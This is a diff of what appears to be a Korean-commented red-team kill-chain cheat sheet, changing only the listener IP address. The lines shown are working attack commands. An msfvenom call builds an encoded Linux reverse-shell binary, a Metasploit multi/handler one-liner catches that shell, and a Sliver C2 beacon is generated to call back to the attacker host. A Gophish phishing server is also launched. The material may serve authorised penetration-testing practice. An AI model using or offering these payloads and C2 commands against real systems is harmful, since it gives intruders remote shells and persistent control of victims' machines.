@@ -964,7 +964,7 @@ spiderfoot-cli -s target.com -t DOMAIN_NAME
 # 2. Weaponization (무기화)
 #    도구: msfvenom, shellter, sliver
 msfvenom -p linux/x64/shell_reverse_tcp \
-    LHOST=192.168.0.112 LPORT=4444 \
+    LHOST=10.20.30.202 LPORT=4444 \
     -e x86/shikata_ga_nai -i 10 \
     -f elf -o /tmp/payload.elf
 
@@ -975,12 +975,12 @@ sudo /opt/gophish/gophish &                                # http://localhost:33
 
 # 4. Exploitation (취약점 악용)
 #    도구: metasploit, sqlmap, XSStrike
-msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST 192.168.0.112; set LPORT 4444; exploit -j"
+msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST 10.20.30.202; set LPORT 4444; exploit -j"
 
 # 5. Installation (설치)
 #    도구: sliver, mythic, weevely
 sliver-server &
-sliver > generate beacon --mtls 192.168.0.112:443
+sliver > generate beacon --mtls 10.20.30.202:443
 
 # 6. Command & Control (C2)
 #    도구: sliver / mythic / havoc / metasploit handler
